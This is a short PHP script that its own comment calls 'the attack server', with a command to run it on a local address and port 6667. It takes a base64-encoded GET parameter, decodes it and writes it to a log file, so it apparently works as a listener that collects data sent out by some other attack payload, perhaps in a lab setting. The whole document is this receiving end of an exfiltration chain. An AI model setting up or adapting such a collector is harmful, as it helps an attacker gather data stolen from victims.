<?php
/**
 * this is the attack server
 * runme -> php -S 10.0.2.15:6667
 */
$data = base64_decode($_GET['foo']);
file_put_contents('server.log', $data);
